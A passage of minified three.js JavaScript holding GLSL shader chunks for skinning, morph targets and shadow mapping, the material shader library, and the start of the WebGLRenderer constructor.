+ totalDiffuse + ambientLightColor * ambient ) + totalSpecular;","#endif"].join("\n"),color_pars_fragment:["#ifdef USE_COLOR","varying vec3 vColor;","#endif"].join("\n"),color_fragment:["#ifdef USE_COLOR","gl_FragColor = gl_FragColor * vec4( vColor, opacity );","#endif"].join("\n"),color_pars_vertex:["#ifdef USE_COLOR","varying vec3 vColor;","#endif"].join("\n"),color_vertex:["#ifdef USE_COLOR","#ifdef GAMMA_INPUT","vColor = color * color;","#else","vColor = color;","#endif","#endif"].join("\n"),skinning_pars_vertex:["#ifdef USE_SKINNING","#ifdef BONE_TEXTURE","uniform sampler2D boneTexture;","mat4 getBoneMatrix( const in float i ) {","float j = i * 4.0;","float x = mod( j, N_BONE_PIXEL_X );","float y = floor( j / N_BONE_PIXEL_X );","const float dx = 1.0 / N_BONE_PIXEL_X;","const float dy = 1.0 / N_BONE_PIXEL_Y;","y = dy * ( y + 0.5 );","vec4 v1 = texture2D( boneTexture, vec2( dx * ( x + 0.5 ), y ) );","vec4 v2 = texture2D( boneTexture, vec2( dx * ( x + 1.5 ), y ) );","vec4 v3 = texture2D( boneTexture, vec2( dx * ( x + 2.5 ), y ) );","vec4 v4 = texture2D( boneTexture, vec2( dx * ( x + 3.5 ), y ) );","mat4 bone = mat4( v1, v2, v3, v4 );","return bone;","}","#else","uniform mat4 boneGlobalMatrices[ MAX_BONES ];","mat4 getBoneMatrix( const in float i ) {","mat4 bone = boneGlobalMatrices[ int(i) ];","return bone;","}","#endif","#endif"].join("\n"),skinbase_vertex:["#ifdef USE_SKINNING","mat4 boneMatX = getBoneMatrix( skinIndex.x );","mat4 boneMatY = getBoneMatrix( skinIndex.y );","#endif"].join("\n"),skinning_vertex:["#ifdef USE_SKINNING","#ifdef USE_MORPHTARGETS","vec4 skinVertex = vec4( morphed, 1.0 );","#else","vec4 skinVertex = vec4( position, 1.0 );","#endif","vec4 skinned  = boneMatX * skinVertex * skinWeight.x;","skinned 	  += boneMatY * skinVertex * skinWeight.y;","#endif"].join("\n"),morphtarget_pars_vertex:["#ifdef USE_MORPHTARGETS","#ifndef USE_MORPHNORMALS","uniform float morphTargetInfluences[ 8 ];","#else","uniform float morphTargetInfluences[ 4 ];","#endif","#endif"].join("\n"),morphtarget_vertex:["#ifdef USE_MORPHTARGETS","vec3 morphed = vec3( 0.0 );","morphed += ( morphTarget0 - position ) * morphTargetInfluences[ 0 ];","morphed += ( morphTarget1 - position ) * morphTargetInfluences[ 1 ];","morphed += ( morphTarget2 - position ) * morphTargetInfluences[ 2 ];","morphed += ( morphTarget3 - position ) * morphTargetInfluences[ 3 ];","#ifndef USE_MORPHNORMALS","morphed += ( morphTarget4 - position ) * morphTargetInfluences[ 4 ];","morphed += ( morphTarget5 - position ) * morphTargetInfluences[ 5 ];","morphed += ( morphTarget6 - position ) * morphTargetInfluences[ 6 ];","morphed += ( morphTarget7 - position ) * morphTargetInfluences[ 7 ];","#endif","morphed += position;","#endif"].join("\n"),default_vertex:["vec4 mvPosition;","#ifdef USE_SKINNING","mvPosition = modelViewMatrix * skinned;","#endif","#if !defined( USE_SKINNING ) && defined( USE_MORPHTARGETS )","mvPosition = modelViewMatrix * vec4( morphed, 1.0 );","#endif","#if !defined( USE_SKINNING ) && ! defined( USE_MORPHTARGETS )","mvPosition = modelViewMatrix * vec4( position, 1.0 );","#endif","gl_Position = projectionMatrix * mvPosition;"].join("\n"),morphnormal_vertex:["#ifdef USE_MORPHNORMALS","vec3 morphedNormal = vec3( 0.0 );","morphedNormal +=  ( morphNormal0 - normal ) * morphTargetInfluences[ 0 ];","morphedNormal +=  ( morphNormal1 - normal ) * morphTargetInfluences[ 1 ];","morphedNormal +=  ( morphNormal2 - normal ) * morphTargetInfluences[ 2 ];","morphedNormal +=  ( morphNormal3 - normal ) * morphTargetInfluences[ 3 ];","morphedNormal += normal;","#endif"].join("\n"),skinnormal_vertex:["#ifdef USE_SKINNING","mat4 skinMatrix = skinWeight.x * boneMatX;","skinMatrix 	+= skinWeight.y * boneMatY;","#ifdef USE_MORPHNORMALS","vec4 skinnedNormal = skinMatrix * vec4( morphedNormal, 0.0 );","#else","vec4 skinnedNormal = skinMatrix * vec4( normal, 0.0 );","#endif","#endif"].join("\n"),defaultnormal_vertex:["vec3 objectNormal;","#ifdef USE_SKINNING","objectNormal = skinnedNormal.xyz;","#endif","#if !defined( USE_SKINNING ) && defined( USE_MORPHNORMALS )","objectNormal = morphedNormal;","#endif","#if !defined( USE_SKINNING ) && ! defined( USE_MORPHNORMALS )","objectNormal = normal;","#endif","#ifdef FLIP_SIDED","objectNormal = -objectNormal;","#endif","vec3 transformedNormal = normalMatrix * objectNormal;"].join("\n"),shadowmap_pars_fragment:["#ifdef USE_SHADOWMAP","uniform sampler2D shadowMap[ MAX_SHADOWS ];","uniform vec2 shadowMapSize[ MAX_SHADOWS ];","uniform float shadowDarkness[ MAX_SHADOWS ];","uniform float shadowBias[ MAX_SHADOWS ];","varying vec4 vShadowCoord[ MAX_SHADOWS ];","float unpackDepth( const in vec4 rgba_depth ) {","const vec4 bit_shift = vec4( 1.0 / ( 256.0 * 256.0 * 256.0 ), 1.0 / ( 256.0 * 256.0 ), 1.0 / 256.0, 1.0 );","float depth = dot( rgba_depth, bit_shift );","return depth;","}","#endif"].join("\n"),shadowmap_fragment:["#ifdef USE_SHADOWMAP","#ifdef SHADOWMAP_DEBUG","vec3 frustumColors[3];","frustumColors[0] = vec3( 1.0, 0.5, 0.0 );","frustumColors[1] = vec3( 0.0, 1.0, 0.8 );","frustumColors[2] = vec3( 0.0, 0.5, 1.0 );","#endif","#ifdef SHADOWMAP_CASCADE","int inFrustumCount = 0;","#endif","float fDepth;","vec3 shadowColor = vec3( 1.0 );","for( int i = 0; i < MAX_SHADOWS; i ++ ) {","vec3 shadowCoord = vShadowCoord[ i ].xyz / vShadowCoord[ i ].w;","bvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );","bool inFrustum = all( inFrustumVec );","#ifdef SHADOWMAP_CASCADE","inFrustumCount += int( inFrustum );","bvec3 frustumTestVec = bvec3( inFrustum, inFrustumCount == 1, shadowCoord.z <= 1.0 );","#else","bvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );","#endif","bool frustumTest = all( frustumTestVec );","if ( frustumTest ) {","shadowCoord.z += shadowBias[ i ];","#if defined( SHADOWMAP_TYPE_PCF )","float shadow = 0.0;","const float shadowDelta = 1.0 / 9.0;","float xPixelOffset = 1.0 / shadowMapSize[ i ].x;","float yPixelOffset = 1.0 / shadowMapSize[ i ].y;","float dx0 = -1.25 * xPixelOffset;","float dy0 = -1.25 * yPixelOffset;","float dx1 = 1.25 * xPixelOffset;","float dy1 = 1.25 * yPixelOffset;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","fDepth = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );","if ( fDepth < shadowCoord.z ) shadow += shadowDelta;","shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );","#elif defined( SHADOWMAP_TYPE_PCF_SOFT )","float shadow = 0.0;","float xPixelOffset = 1.0 / shadowMapSize[ i ].x;","float yPixelOffset = 1.0 / shadowMapSize[ i ].y;","float dx0 = -1.0 * xPixelOffset;","float dy0 = -1.0 * yPixelOffset;","float dx1 = 1.0 * xPixelOffset;","float dy1 = 1.0 * yPixelOffset;","mat3 shadowKernel;","mat3 depthKernel;","depthKernel[0][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy0 ) ) );","depthKernel[0][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, 0.0 ) ) );","depthKernel[0][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx0, dy1 ) ) );","depthKernel[1][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy0 ) ) );","depthKernel[1][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy ) );","depthKernel[1][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( 0.0, dy1 ) ) );","depthKernel[2][0] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy0 ) ) );","depthKernel[2][1] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, 0.0 ) ) );","depthKernel[2][2] = unpackDepth( texture2D( shadowMap[ i ], shadowCoord.xy + vec2( dx1, dy1 ) ) );","vec3 shadowZ = vec3( shadowCoord.z );","shadowKernel[0] = vec3(lessThan(depthKernel[0], shadowZ ));","shadowKernel[0] *= vec3(0.25);","shadowKernel[1] = vec3(lessThan(depthKernel[1], shadowZ ));","shadowKernel[1] *= vec3(0.25);","shadowKernel[2] = vec3(lessThan(depthKernel[2], shadowZ ));","shadowKernel[2] *= vec3(0.25);","vec2 fractionalCoord = 1.0 - fract( shadowCoord.xy * shadowMapSize[i].xy );","shadowKernel[0] = mix( shadowKernel[1], shadowKernel[0], fractionalCoord.x );","shadowKernel[1] = mix( shadowKernel[2], shadowKernel[1], fractionalCoord.x );","vec4 shadowValues;","shadowValues.x = mix( shadowKernel[0][1], shadowKernel[0][0], fractionalCoord.y );","shadowValues.y = mix( shadowKernel[0][2], shadowKernel[0][1], fractionalCoord.y );","shadowValues.z = mix( shadowKernel[1][1], shadowKernel[1][0], fractionalCoord.y );","shadowValues.w = mix( shadowKernel[1][2], shadowKernel[1][1], fractionalCoord.y );","shadow = dot( shadowValues, vec4( 1.0 ) );","shadowColor = shadowColor * vec3( ( 1.0 - shadowDarkness[ i ] * shadow ) );","#else","vec4 rgbaDepth = texture2D( shadowMap[ i ], shadowCoord.xy );","float fDepth = unpackDepth( rgbaDepth );","if ( fDepth < shadowCoord.z )","shadowColor = shadowColor * vec3( 1.0 - shadowDarkness[ i ] );","#endif","}","#ifdef SHADOWMAP_DEBUG","#ifdef SHADOWMAP_CASCADE","if ( inFrustum && inFrustumCount == 1 ) gl_FragColor.xyz *= frustumColors[ i ];","#else","if ( inFrustum ) gl_FragColor.xyz *= frustumColors[ i ];","#endif","#endif","}","#ifdef GAMMA_OUTPUT","shadowColor *= shadowColor;","#endif","gl_FragColor.xyz = gl_FragColor.xyz * shadowColor;","#endif"].join("\n"),shadowmap_pars_vertex:["#ifdef USE_SHADOWMAP","varying vec4 vShadowCoord[ MAX_SHADOWS ];","uniform mat4 shadowMatrix[ MAX_SHADOWS ];","#endif"].join("\n"),shadowmap_vertex:["#ifdef USE_SHADOWMAP","for( int i = 0; i < MAX_SHADOWS; i ++ ) {","vShadowCoord[ i ] = shadowMatrix[ i ] * worldPosition;","}","#endif"].join("\n"),alphatest_fragment:["#ifdef ALPHATEST","if ( gl_FragColor.a < ALPHATEST ) discard;","#endif"].join("\n"),linear_to_gamma_fragment:["#ifdef GAMMA_OUTPUT","gl_FragColor.xyz = sqrt( gl_FragColor.xyz );","#endif"].join("\n")};THREE.UniformsUtils={merge:function(b){var c,f,e,a={};for(c=0;c<b.length;c++){e=this.clone(b[c]);for(f in e){a[f]=e[f]}}return a},clone:function(a){var e,f,g,c,b={};for(e in a){b[e]={};for(f in a[e]){c=a[e][f];if(c instanceof THREE.Color||c instanceof THREE.Vector2||c instanceof THREE.Vector3||c instanceof THREE.Vector4||c instanceof THREE.Matrix4||c instanceof THREE.Texture){b[e][f]=c.clone()}else{if(c instanceof Array){b[e][f]=c.slice()}else{b[e][f]=c}}}}return b}};THREE.UniformsLib={common:{diffuse:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},map:{type:"t",value:null},offsetRepeat:{type:"v4",value:new THREE.Vector4(0,0,1,1)},lightMap:{type:"t",value:null},specularMap:{type:"t",value:null},envMap:{type:"t",value:null},flipEnvMap:{type:"f",value:-1},useRefract:{type:"i",value:0},reflectivity:{type:"f",value:1},refractionRatio:{type:"f",value:0.98},combine:{type:"i",value:0},morphTargetInfluences:{type:"f",value:0}},bump:{bumpMap:{type:"t",value:null},bumpScale:{type:"f",value:1}},normalmap:{normalMap:{type:"t",value:null},normalScale:{type:"v2",value:new THREE.Vector2(1,1)}},fog:{fogDensity:{type:"f",value:0.00025},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2000},fogColor:{type:"c",value:new THREE.Color(16777215)}},lights:{ambientLightColor:{type:"fv",value:[]},directionalLightDirection:{type:"fv",value:[]},directionalLightColor:{type:"fv",value:[]},hemisphereLightDirection:{type:"fv",value:[]},hemisphereLightSkyColor:{type:"fv",value:[]},hemisphereLightGroundColor:{type:"fv",value:[]},pointLightColor:{type:"fv",value:[]},pointLightPosition:{type:"fv",value:[]},pointLightDistance:{type:"fv1",value:[]},spotLightColor:{type:"fv",value:[]},spotLightPosition:{type:"fv",value:[]},spotLightDirection:{type:"fv",value:[]},spotLightDistance:{type:"fv1",value:[]},spotLightAngleCos:{type:"fv1",value:[]},spotLightExponent:{type:"fv1",value:[]}},particle:{psColor:{type:"c",value:new THREE.Color(15658734)},opacity:{type:"f",value:1},size:{type:"f",value:1},scale:{type:"f",value:1},map:{type:"t",value:null},fogDensity:{type:"f",value:0.00025},fogNear:{type:"f",value:1},fogFar:{type:"f",value:2000},fogColor:{type:"c",value:new THREE.Color(16777215)}},shadowmap:{shadowMap:{type:"tv",value:[]},shadowMapSize:{type:"v2v",value:[]},shadowBias:{type:"fv1",value:[]},shadowDarkness:{type:"fv1",value:[]},shadowMatrix:{type:"m4v",value:[]}}};THREE.ShaderLib={basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.shadowmap]),vertexShader:[THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.skinbase_vertex,"#ifdef USE_ENVMAP",THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"#endif",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform float opacity;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {","gl_FragColor = vec4( diffuse, opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{ambient:{type:"c",value:new THREE.Color(16777215)},emissive:{type:"c",value:new THREE.Color(0)},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define LAMBERT","varying vec3 vLightFront;","#ifdef DOUBLE_SIDED","varying vec3 vLightBack;","#endif",THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_lambert_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.lights_lambert_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform float opacity;","varying vec3 vLightFront;","#ifdef DOUBLE_SIDED","varying vec3 vLightBack;","#endif",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {","gl_FragColor = vec4( vec3 ( 1.0 ), opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,"#ifdef DOUBLE_SIDED","if ( gl_FrontFacing )","gl_FragColor.xyz *= vLightFront;","else","gl_FragColor.xyz *= vLightBack;","#else","gl_FragColor.xyz *= vLightFront;","#endif",THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},phong:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.bump,THREE.UniformsLib.normalmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,THREE.UniformsLib.shadowmap,{ambient:{type:"c",value:new THREE.Color(16777215)},emissive:{type:"c",value:new THREE.Color(0)},specular:{type:"c",value:new THREE.Color(1118481)},shininess:{type:"f",value:30},wrapRGB:{type:"v3",value:new THREE.Vector3(1,1,1)}}]),vertexShader:["#define PHONG","varying vec3 vViewPosition;","varying vec3 vNormal;",THREE.ShaderChunk.map_pars_vertex,THREE.ShaderChunk.lightmap_pars_vertex,THREE.ShaderChunk.envmap_pars_vertex,THREE.ShaderChunk.lights_phong_pars_vertex,THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.map_vertex,THREE.ShaderChunk.lightmap_vertex,THREE.ShaderChunk.color_vertex,THREE.ShaderChunk.morphnormal_vertex,THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.skinnormal_vertex,THREE.ShaderChunk.defaultnormal_vertex,"vNormal = normalize( transformedNormal );",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,"vViewPosition = -mvPosition.xyz;",THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.envmap_vertex,THREE.ShaderChunk.lights_phong_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform float opacity;","uniform vec3 ambient;","uniform vec3 emissive;","uniform vec3 specular;","uniform float shininess;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_pars_fragment,THREE.ShaderChunk.lightmap_pars_fragment,THREE.ShaderChunk.envmap_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.lights_phong_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,THREE.ShaderChunk.bumpmap_pars_fragment,THREE.ShaderChunk.normalmap_pars_fragment,THREE.ShaderChunk.specularmap_pars_fragment,"void main() {","gl_FragColor = vec4( vec3 ( 1.0 ), opacity );",THREE.ShaderChunk.map_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.specularmap_fragment,THREE.ShaderChunk.lights_phong_fragment,THREE.ShaderChunk.lightmap_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.envmap_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.linear_to_gamma_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},particle_basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.particle,THREE.UniformsLib.shadowmap]),vertexShader:["uniform float size;","uniform float scale;",THREE.ShaderChunk.color_pars_vertex,THREE.ShaderChunk.shadowmap_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );","#ifdef USE_SIZEATTENUATION","gl_PointSize = size * ( scale / length( mvPosition.xyz ) );","#else","gl_PointSize = size;","#endif","gl_Position = projectionMatrix * mvPosition;",THREE.ShaderChunk.worldpos_vertex,THREE.ShaderChunk.shadowmap_vertex,"}"].join("\n"),fragmentShader:["uniform vec3 psColor;","uniform float opacity;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.map_particle_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,THREE.ShaderChunk.shadowmap_pars_fragment,"void main() {","gl_FragColor = vec4( psColor, opacity );",THREE.ShaderChunk.map_particle_fragment,THREE.ShaderChunk.alphatest_fragment,THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.shadowmap_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},dashed:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,{scale:{type:"f",value:1},dashSize:{type:"f",value:1},totalSize:{type:"f",value:2}}]),vertexShader:["uniform float scale;","attribute float lineDistance;","varying float vLineDistance;",THREE.ShaderChunk.color_pars_vertex,"void main() {",THREE.ShaderChunk.color_vertex,"vLineDistance = scale * lineDistance;","vec4 mvPosition = modelViewMatrix * vec4( position, 1.0 );","gl_Position = projectionMatrix * mvPosition;","}"].join("\n"),fragmentShader:["uniform vec3 diffuse;","uniform float opacity;","uniform float dashSize;","uniform float totalSize;","varying float vLineDistance;",THREE.ShaderChunk.color_pars_fragment,THREE.ShaderChunk.fog_pars_fragment,"void main() {","if ( mod( vLineDistance, totalSize ) > dashSize ) {","discard;","}","gl_FragColor = vec4( diffuse, opacity );",THREE.ShaderChunk.color_fragment,THREE.ShaderChunk.fog_fragment,"}"].join("\n")},depth:{uniforms:{mNear:{type:"f",value:1},mFar:{type:"f",value:2000},opacity:{type:"f",value:1}},vertexShader:["void main() {","gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );","}"].join("\n"),fragmentShader:["uniform float mNear;","uniform float mFar;","uniform float opacity;","void main() {","float depth = gl_FragCoord.z / gl_FragCoord.w;","float color = 1.0 - smoothstep( mNear, mFar, depth );","gl_FragColor = vec4( vec3( color ), opacity );","}"].join("\n")},normal:{uniforms:{opacity:{type:"f",value:1}},vertexShader:["varying vec3 vNormal;",THREE.ShaderChunk.morphtarget_pars_vertex,"void main() {","vNormal = normalize( normalMatrix * normal );",THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.default_vertex,"}"].join("\n"),fragmentShader:["uniform float opacity;","varying vec3 vNormal;","void main() {","gl_FragColor = vec4( 0.5 * normalize( vNormal ) + 0.5, opacity );","}"].join("\n")},depthRGBA:{uniforms:{},vertexShader:[THREE.ShaderChunk.morphtarget_pars_vertex,THREE.ShaderChunk.skinning_pars_vertex,"void main() {",THREE.ShaderChunk.skinbase_vertex,THREE.ShaderChunk.morphtarget_vertex,THREE.ShaderChunk.skinning_vertex,THREE.ShaderChunk.default_vertex,"}"].join("\n"),fragmentShader:["vec4 pack_depth( const in float depth ) {","const vec4 bit_shift = vec4( 256.0 * 256.0 * 256.0, 256.0 * 256.0, 256.0, 1.0 );","const vec4 bit_mask  = vec4( 0.0, 1.0 / 256.0, 1.0 / 256.0, 1.0 / 256.0 );","vec4 res = fract( depth * bit_shift );","res -= res.xxyz * bit_mask;","return res;","}","void main() {","gl_FragData[ 0 ] = pack_depth( gl_FragCoord.z );","}"].join("\n")}};THREE.WebGLRenderer=function(aO){aO=aO||{};var aZ=aO.canvas!==undefined?aO.canvas:document.createElement("canvas"),l=aO.precision!==undefined?aO.precision:"highp",bE=aO.alpha!==undefined?aO.alpha:true,a2=aO.premultipliedAlpha!==undefined?aO.premultipliedAlpha:true,b0=aO.antialias!==undefined?aO.antialias:false,f=aO.stencil!==undefined?aO.stencil:true,X=aO.preserveDrawingBuffer!==undefined?aO.preserveDrawingBuffer:false,bt=new THREE.Color(0),W=0;if(aO.clearColor!==undefined){console.warn("DEPRECATED: clearColor in WebGLRenderer constructor parameters is being removed. Use .setClearColor() instead.");bt.setHex(aO.clearColor)}if(aO.clearAlpha!==undefined){console.warn("DEPRECATED: clearAlpha in WebGLRenderer constructor parameters is being removed. Use .setClearColor() instead.");W=aO.clearAlpha}this.domElement=aZ;this.context=null;this.devicePixelRatio=aO.devicePixelRatio!==undefined?aO.devicePixelRatio:window.devicePixelRatio!==undefined?window.devicePixelRatio:1;this.autoClear=true;this.autoClearColor=true;this.autoClearDepth=true;this.autoClearStencil=true;this.sortObjects=true;this.autoUpdateObjects=true;this.gammaInput=false;this.gammaOutput=false;this.physicallyBasedShading=false;this.shadowMapEnabled=false;this.shadowMapAutoUpdate=true;this.shadowMapType=THREE.PCFShadowMap;this.shadowMapCullFace=THREE.CullFaceFront;this.shadowMapDebug=false;this.shadowMapCascade=false;this.maxMorphTargets=8;this.maxMorphNormals=4;this.autoScaleCubemaps=true;this.renderPluginsPre=[];this.renderPluginsPost=[];this.info={memory:{programs:0,geometries:0,textures:0},render:{calls:0,vertices:0,faces:0,points:0}};var aP=this,bF=[],aC=0,an=null,bH=null,a3=-1,D=null,aM=null,U=0,bg=0,bm=-1,m=-1,k=-1,ak=-1,bR=-1,av=-1,a=-1,bA=-1,aL=null,bP=null,bc=null,bo=null,a5=0,a4=0,bT=0,aW=0,B=0,aV=0,L={},bu=new THREE.Frustum(),a1=new THREE.Matrix4(),E=new THREE.Matrix4(),V=new THREE.Vector3(),aN=new THREE.Vector3(),b1=true,br={ambient:[0,0,0],directional:{length:0,colors:new Array(),positions:new Array()},point:{length:0,colors:new Array(),positions:new Array(),distances:new Array()},spot:{length:0,colors:new Array(),positions:new Array(),distances:new Array(),directions:new Array(),anglesCos:new Array(),exponents:new Array()},hemi:{length:0,skyColors:new Array(),groundColors:new Array(),positions:new Array()}};var c;var p;var bf;var s;var aG;bs();be();this.context=c;var bK=c.getParameter(c.MAX_TEXTURE_IMAGE_UNITS);var b=c.getParameter(c.MAX_VERTEX_TEXTURE_IMAGE_UNITS);var A=c.getParameter(c.MAX_TEXTURE_SIZE);var ap=c.getParameter(c.MAX_CUBE_MAP_TEXTURE_SIZE);var bD=s?c.getParameter(s.MAX_TEXTURE_MAX_ANISOTROPY_EXT):0;var aX=(b>0);var Y=aX&&p;var bB=aG?c.getParameter(c.COMPRESSED_TEXTURE_FORMATS):[];var by=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.HIGH_FLOAT);var bS=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.MEDIUM_FLOAT);var bO=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.LOW_FLOAT);var ao=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.HIGH_FLOAT);var bG=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.MEDIUM_FLOAT);var aA=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.LOW_FLOAT);var o=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.HIGH_INT);var aH=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.MEDIUM_INT);var O=c.getShaderPrecisionFormat(c.VERTEX_SHADER,c.LOW_INT);var bw=c.getShaderPrecisionFormat(c.FRAGMENT_SHADER,c.HIGH_INT);var 